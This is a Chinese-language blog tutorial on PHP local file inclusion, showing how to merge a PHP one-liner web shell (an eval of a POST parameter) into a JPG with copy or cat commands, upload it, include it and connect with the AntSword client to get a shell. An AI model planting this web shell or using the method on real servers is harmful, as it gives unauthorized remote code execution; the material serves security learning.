---
title: LFI本地文件包含
tags: 文件包含
categories: 技术分享
abbrlink: 2eda3969
date: 2019-10-15 20:33:07
updated: 2019-10-15 20:33:07
---

**LFI(Local File Inclusion)**
本地文件包含漏洞，指的是服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，利用这个特性，配合文件上传就可以getshell。

已知服务器存在文件包含且存在上传点

![](https://i.loli.net/2019/10/28/PEFt7A4zhejvCrT.png)

只能上传图片，可制作图片一句话木马进行上传

在Windows可以通过cmd制作一句话木马。

命令为

```
copy 1.jpg/b+2.php/a 3.jpg
```

参数/b指定以二进制格式复制、合并文件。用于图像类/声音类文件

参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件

这条命令就是把j1.pg和2.php合并到一起，生成3.jpg

Linux/Macos下通过终端制作

命令为 

```
cat 1.php >> 2.jpg 
```

这句命令是将1.php追加到2.jpg里面

如果是两个文件合并生成第三个

命令为 

```
cat 1.php 2.jpg >> 3.jpg 
```

PHP一句话 

```
<?php eval(@$_POST['xcx']); ?> 
```

![](https://i.loli.net/2019/10/28/nbHKW8wAzc5efCg.png)

上传图片马

![](https://i.loli.net/2019/10/28/OSp7EcsZQwvIG9V.png)

利用文件包含

![](https://i.loli.net/2019/10/28/AsC3XSg48rGfWTF.png)

可看到图片被解析成了PHP（因为被解析了所以不会显示一句话木马）

使用蚁剑连接

![](https://i.loli.net/2019/10/28/i9QhcJI3vAtoEsg.png)

成功getshell

![](https://i.loli.net/2019/10/28/bdesIZP6pYgEzaG.png)

